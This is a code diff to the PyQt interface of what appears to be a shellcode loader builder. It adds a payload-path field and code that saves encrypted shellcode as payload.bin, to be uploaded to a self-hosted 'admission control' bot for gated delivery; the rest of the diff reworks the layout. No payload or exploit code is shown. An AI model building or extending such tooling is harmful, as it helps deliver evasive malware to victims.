@@ -210,32 +210,33 @@ class MainWindow(QMainWindow):
         else:
             self.access_control_check.setEnabled(True)
 
+    def browse_payload_path(self):
+        """选择payload.bin的保存目录"""
+        dir_path = QFileDialog.getExistingDirectory(self, "选择Payload保存目录")
+        if dir_path:
+            self.payload_path_edit.setText(dir_path)
+
     def init_ui(self):
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         layout = QVBoxLayout(central_widget)
         layout.setSpacing(20)  
         layout.setContentsMargins(20, 20, 20, 20)  
-        # 修改Shellcode加密设置区域的高度和布局
         encryption_group = QGroupBox("Shellcode加密设置")
-        encryption_group.setFixedHeight(120)  
+        encryption_group.setFixedHeight(90)  
         encryption_layout = QHBoxLayout()  
-        encryption_layout.setSpacing(10)
-        encryption_layout.setContentsMargins(10, 10, 10, 10)
+        encryption_layout.setSpacing(5)  
+        encryption_layout.setContentsMargins(5, 5, 5, 5) 
         
-        # 左侧垂直布局放置复选框和加密方式
-        left_layout = QVBoxLayout()
-        self.sgn_check = QCheckBox("启用SGN预处理shellcode")
+        left_layout = QHBoxLayout()  
+        self.sgn_check = QCheckBox("启用SGN预处理")  
         left_layout.addWidget(self.sgn_check)
         
-        enc_method_layout = QHBoxLayout()
-        enc_method_layout.setSpacing(5)  
         enc_method_label = QLabel("加密方式:")
         self.encryption_combo = QComboBox()
         self.encryption_combo.addItems(self.config_manager.encryption_methods)
-        enc_method_layout.addWidget(enc_method_label)
-        enc_method_layout.addWidget(self.encryption_combo)
-        left_layout.addLayout(enc_method_layout)
+        left_layout.addWidget(enc_method_label)
+        left_layout.addWidget(self.encryption_combo)
         
         encryption_layout.addLayout(left_layout, 1)
         
@@ -313,12 +314,13 @@ class MainWindow(QMainWindow):
         sign_layout.addLayout(access_control_layout)
 
         # 添加准入控制相关字段
+
         self.access_control_group = QGroupBox("准入控制配置")
         self.access_control_group.setVisible(False)  # 默认隐藏
         access_control_fields_layout = QGridLayout()  
-        access_control_fields_layout.setSpacing(5)
+        access_control_fields_layout.setSpacing(3)  
+        access_control_fields_layout.setContentsMargins(3, 3, 3, 3)  
         
-        # App ID
         app_id_label = QLabel("App ID:")
         self.app_id_edit = QLineEdit()
         access_control_fields_layout.addWidget(app_id_label, 0, 0)
@@ -327,14 +329,14 @@ class MainWindow(QMainWindow):
         # App Secret
         app_secret_label = QLabel("App Secret:")
         self.app_secret_edit = QLineEdit()
-        access_control_fields_layout.addWidget(app_secret_label, 1, 0)
-        access_control_fields_layout.addWidget(self.app_secret_edit, 1, 1)
+        access_control_fields_layout.addWidget(app_secret_label, 0, 2)
+        access_control_fields_layout.addWidget(self.app_secret_edit, 0, 3)
         
         # VPS URL
         vps_url_label = QLabel("VPS URL:")
         self.vps_url_edit = QLineEdit()
-        access_control_fields_layout.addWidget(vps_url_label, 0, 2)
-        access_control_fields_layout.addWidget(self.vps_url_edit, 0, 3)
+        access_control_fields_layout.addWidget(vps_url_label, 1, 0)
+        access_control_fields_layout.addWidget(self.vps_url_edit, 1, 1)
         
         # Sheet ID
         sheet_id_label = QLabel("Sheet ID:")
@@ -345,14 +347,24 @@ class MainWindow(QMainWindow):
         spreadsheet_token_label = QLabel("Spreadsheet Token:")
         self.spreadsheet_token_edit = QLineEdit()
         access_control_fields_layout.addWidget(spreadsheet_token_label, 2, 0)
-        access_control_fields_layout.addWidget(self.spreadsheet_token_edit, 2, 1, 1, 3) 
-
+        access_control_fields_layout.addWidget(self.spreadsheet_token_edit, 2, 1, 1, 3)
+        
+        payload_path_label = QLabel("Payload路径:")  
+        self.payload_path_edit = QLineEdit()
+        self.payload_path_edit.setPlaceholderText("留空则保存到Loader目录")
+        browse_payload_path_btn = QPushButton("浏览")
+        browse_payload_path_btn.clicked.connect(self.browse_payload_path)
+        
+        access_control_fields_layout.addWidget(payload_path_label, 3, 0)
+        access_control_fields_layout.addWidget(self.payload_path_edit, 3, 1, 1, 2)
+        access_control_fields_layout.addWidget(browse_payload_path_btn, 3, 3)
+        
         self.access_control_group.setLayout(access_control_fields_layout)
         sign_layout.addWidget(self.access_control_group)
         
-        # 设置合理的大小策略
+        
         self.access_control_group.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Fixed)
-        self.access_control_group.setMaximumHeight(100)  # 限制最大高度
+        self.access_control_group.setMaximumHeight(120)  
 
         output_file_layout = QHBoxLayout()
         self.output_path = QLineEdit()
@@ -581,7 +593,16 @@ class MainWindow(QMainWindow):
             elif self.access_control_check.isChecked():
                 # 启用准入控制，只写入密钥信息
                 self.config_manager.save_to_header_key_only()
-                QMessageBox.information(self, "提示", "已启用准入控制，请自行搭建准入bot")
+                
+                payload_dir = self.payload_path_edit.text() if hasattr(self, 'payload_path_edit') and self.payload_path_edit.text() else os.path.join(current_dir, "..", "Loader")
+                payload_path = os.path.join(payload_dir, "payload.bin")
+                
+                os.makedirs(os.path.dirname(payload_path), exist_ok=True)
+                
+                with open(payload_path, 'wb') as f:
+                    f.write(encrypted_data)
+                
+                QMessageBox.information(self, "提示", f"已启用准入控制,请自行搭建准入bot,payload.bin已保存到：{payload_path},自行上传至bot同目录")
             else:
                 self.config_manager.save_to_header(encrypted_data)
             
